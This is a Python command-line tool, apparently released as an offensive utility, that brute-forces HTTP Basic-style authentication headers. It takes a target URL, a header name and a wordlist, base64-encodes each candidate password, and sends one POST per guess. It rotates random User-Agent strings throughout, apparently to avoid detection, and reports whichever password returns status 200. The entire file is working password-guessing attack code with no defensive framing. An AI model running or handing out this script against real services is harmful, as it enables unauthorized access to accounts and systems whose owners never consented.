import requests
import base64
import argparse
import time
import random
from tqdm import tqdm
from termcolor import colored
from tabulate import tabulate

def print_banner():
    banner = """
    ██████╗ ███████╗███████╗██╗   ██╗███████╗███████╗
    ██╔══██╗██╔════╝██╔════╝██║   ██║██╔════╝██╔════╝
    ██║  ██║█████╗  █████╗  ██║   ██║███████╗█████╗  
    ██║  ██║██╔══╝  ██╔══╝  ██║   ██║╚════██║██╔══╝  
    ██████╔╝███████╗██║     ╚██████╔╝███████║███████╗
    ╚═════╝ ╚══════╝╚═╝      ╚═════╝ ╚══════╝╚══════╝

    Author:hxlxmjxbbxs
    Github: https://github.com/hxlxmjxbbxs
    Released: 2023/06/07
    """
    print(banner)

def load_user_agents(user_agents_file):
    with open(user_agents_file, 'r') as f:
        return f.read().splitlines()

def encode_wordlist(wordlist):
    with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
        words = f.read().splitlines()
    return [(word, base64.b64encode(word.encode()).decode()) for word in words]

def dictionary_attack(url, header, wordlist, user_agents):

    original_url = url
    original_header = header
    original_wordlist = wordlist
    original_user_agents = user_agents

    try:
        encoded_words = encode_wordlist(wordlist)
        user_agents = load_user_agents(user_agents)
        start_time = time.time()

        table = []
        for i, (word, encoded_word) in enumerate(tqdm(encoded_words, ncols=70)):
            headers = {
                header: 'Basic ' + encoded_word,
                'User-Agent': random.choice(user_agents)
            }
            response = requests.post(url, headers=headers)
            elapsed_time = time.time() - start_time
            remaining_time = elapsed_time / (i+1) * (len(encoded_words) - i - 1)
            status_code = response.status_code if response.status_code == 200 else colored(response.status_code, 'red')

            table = [
                     ["Current password", word + " / " + encoded_word],
                     ["Estimated remaining time", f"{remaining_time:.2f} seconds"],
                     ["Status code", status_code],
                     ["Content length", len(response.content)]
                    ]

            print("\033c", end="") 
            print_banner()
            print("\n" + tabulate(table, tablefmt="grid") + "\n" + "\n", end="\r") 

            if response.status_code == 200:
                print(f"\nSuccess with : {word}")
                return

    except KeyboardInterrupt:
        confirmation = input("\nAre you sure you want to exit? Y/n ")
        if confirmation.lower() == 'n':
            print("Canceling the exit. Resuming the attack...")

            dictionary_attack(original_url, original_header, original_wordlist, original_user_agents)
        else:
            print("Exiting the program.")
            exit(0)

    print("\nAttack finished, no successful attempts")


if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description='Dictionary attack script')
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-H', '--header', help='Header to attack')
    parser.add_argument('-w', '--wordlist', help='Wordlist file to use')
    parser.add_argument('-a', '--user_agents', help='User-agent list file to use')

    args = parser.parse_args()

    try:
        dictionary_attack(args.url, args.header, args.wordlist, args.user_agents)
    except KeyboardInterrupt:
        confirmation = input("\nAre you sure you want to exit? Y/n ")
        if confirmation.lower() == 'n':
            print("Canceling the exit. Resuming the attack...")
            dictionary_attack(args.url, args.header, args.wordlist, args.user_agents)
        else:
            print("Exiting the program.")
            exit(0)

